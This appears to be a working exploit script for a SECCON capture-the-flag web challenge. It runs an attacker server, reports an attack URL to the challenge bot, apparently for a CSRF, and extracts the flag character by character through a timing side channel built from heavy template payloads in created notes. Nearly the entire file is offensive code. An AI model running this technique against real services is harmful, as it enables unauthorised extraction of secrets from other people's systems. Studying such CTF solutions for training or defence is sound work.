const fastify = require("fastify")();
const fs = require("node:fs").promises;
const crypto = require("node:crypto");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_HOST = process.env.SECCON_HOST ?? fail("No SECCON_HOST");
const SECCON_APP_PORT =
  process.env.SECCON_APP_PORT ?? fail("No SECCON_APP_PORT");

const SECCON_GLOBAL_BASE_URL = `http://${SECCON_HOST}:${SECCON_APP_PORT}`;
const SECCON_DOCKER_BASE_URL = `http://web:${SECCON_APP_PORT}`;

const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = "8080";

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const BASIC_USERNAME = process.env.BASIC_USERNAME ?? fail("No BASIC_USERNAME");
const BASIC_PASSWORD = process.env.BASIC_PASSWORD ?? fail("No BASIC_PASSWORD");

const authHeader =
  "Basic " +
  Buffer.from(`${BASIC_USERNAME}:${BASIC_PASSWORD}`).toString("base64");

const CHARS = "}_abcdefghijklmnopqrstuvwxyz0123456789";
const HEAVY_LEVEL = 20000;

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = async (url) => {
  const res = await fetch(`${SECCON_GLOBAL_BASE_URL}/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: authHeader,
    },
    body: JSON.stringify({
      url,
    }),
  }).then((r) => r.text());
  console.log(res); // "Received :)"
};

const createNote = (note, cookie) =>
  fetch(`${SECCON_GLOBAL_BASE_URL}/api/notes/create`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: authHeader,
      Cookie: cookie,
    },
    body: JSON.stringify({
      note,
    }),
  });

const deleteNote = (index, cookie) =>
  fetch(`${SECCON_GLOBAL_BASE_URL}/api/notes/delete`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: authHeader,
      Cookie: cookie,
    },
    body: JSON.stringify({
      index,
    }),
  });

const measureTime = async (cookie) => {
  const start = performance.now();
  await fetch(`${SECCON_GLOBAL_BASE_URL}/api/notes`, {
    method: "GET",
    headers: {
      Cookie: cookie,
      Authorization: authHeader,
    },
  });
  return performance.now() - start;
};

const leak = async (flagIndex, cookie) => {
  let minTime = 1e10;
  let minChar;
  for (const char of CHARS) {
    const note = `${flagIndex}-${char}-${"{{x}}".repeat(HEAVY_LEVEL)}`;
    await createNote(note, cookie);
    const time = await measureTime(cookie);
    await deleteNote(0, cookie);
    if (time < minTime) {
      minTime = time;
      minChar = char;
    }
  }
  if (!minChar) fail(`Failed at ${flagIndex}`);

  return minChar;
};

const exploit = async () => {
  const name = crypto.randomBytes(12).toString("base64");
  const password = crypto.randomBytes(12).toString("base64");

  const res = await fetch(`${SECCON_GLOBAL_BASE_URL}/signup`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: authHeader,
    },
    body: JSON.stringify({
      name,
      password,
      emoji: "x",
    }),
    redirect: "manual",
  });
  const cookie = res.headers.get("Set-Cookie").split(";")[0];

  let prefix = "SECCON{";
  while (!prefix.endsWith("}")) {
    prefix += await leak(prefix.length, cookie);
    console.log(prefix);
    await sleep(500);
  }

  console.log(`Flag: ${prefix}`);
  process.exit(0);
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.post("/start-leak", async (req, reply) => {
    console.log("leak:");
    exploit();
    return "";
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err.toString());

      await sleep(2 * 1000);
      await reportUrl(
        `${ATTACK_BASE_URL}?${new URLSearchParams({
          baseUrl: SECCON_DOCKER_BASE_URL,
        })}`
      );

      await sleep(180 * 1000);
      fail("Failed");
    }
  );
};
start();
